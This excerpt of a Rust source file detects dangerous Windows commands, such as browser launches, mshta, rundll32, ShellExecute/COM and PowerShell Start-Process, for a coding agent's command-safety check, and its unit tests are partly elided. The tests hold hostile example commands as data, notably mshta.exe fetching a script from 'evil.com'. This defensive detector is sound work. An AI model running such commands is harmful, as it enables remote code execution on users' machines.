...
//!
//! Detects dangerous Windows command patterns that could open URLs in browsers,
//! execute arbitrary code via COM objects, or perform other unsafe operations.
//!
//! Ported from codex-rs/core/src/command_safety/windows_dangerous_commands.rs
...
/// Check if a Windows command is dangerous
///
/// Returns true for commands that could:
/// - Open URLs in browsers (via Start-Process, cmd start, etc.)
/// - Execute via ShellExecute/COM patterns
/// - Launch browsers directly with URLs
...
fn is_dangerous_powershell(command: &[String]) -> bool {
    ...
    // best-effort shell-words split of the script text, not a full PS parser.
...
mod tests {
    ...
    #[test]
    fn chrome_with_url_is_dangerous() {
        assert!(is_dangerous_command_windows(&vec_str(&[
            "chrome.exe",
            "https://malicious.com"
        ])));
    ...
    #[test]
    fn mshta_with_url_is_dangerous() {
        assert!(is_dangerous_command_windows(&vec_str(&[
            "mshta.exe",
            "https://evil.com/script.hta"
        ])));
    }

    #[test]
    fn rundll32_url_dll_with_url_is_dangerous() {
        assert!(is_dangerous_command_windows(&vec_str(&[
            "rundll32.exe",
    ...
    #[test]
    fn powershell_ii_alias_with_url_is_dangerous() {
        assert!(is_dangerous_command_windows(&vec_str(&[
            "powershell",
            "-Command",
    ...
    #[test]
    fn safe_local_commands() {
        // Local file operations should not be flagged
        assert!(!is_dangerous_command_windows(&vec_str(&[
            "powershell",
            "-Command",
            "Get-ChildItem"
    ...
    #[test]
    fn empty_command_is_not_dangerous() {
        assert!(!is_dangerous_command_windows(&[]));
    }

    #[test]
    fn pwsh_start_process_url_is_dangerous() {
        assert!(is_dangerous_command_windows(&vec_str(&[
            "pwsh.exe",
            "-NoProfile",
            "-Command",
    ...
    #[test]
    fn shellexecute_com_is_dangerous() {
        assert!(is_dangerous_command_windows(&vec_str(&[
            "powershell",
            "-Command",
